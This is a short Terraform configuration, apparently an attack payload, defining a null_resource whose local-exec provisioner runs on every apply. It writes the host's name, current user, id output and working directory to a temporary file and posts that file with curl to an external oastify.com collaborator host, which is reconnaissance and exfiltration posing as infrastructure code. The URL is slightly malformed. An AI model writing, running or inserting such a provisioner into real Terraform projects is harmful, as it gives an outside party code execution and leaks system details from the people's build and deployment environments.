resource "null_resource" "investigate" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== BASIC RECON ===" > /tmp/recon.txt
      echo "Hostname: $(hostname)" >> /tmp/recon.txt
      echo "User: $(whoami)" >> /tmp/recon.txt
      echo "ID: $(id)" >> /tmp/recon.txt
      echo "PWD: $(pwd)" >> /tmp/recon.txt
      echo "=== SENDING TO COLLABORATOR ===" >> /tmp/recon.txt
      curl -X POST --data-binary @/tmp/recon.txt http:/0wx3kzgb6dvwj42l36v2at60brhi596xv.oastify.com/recon
    EOT
  }
  
  triggers = {
    investigation = timestamp()
  }
}
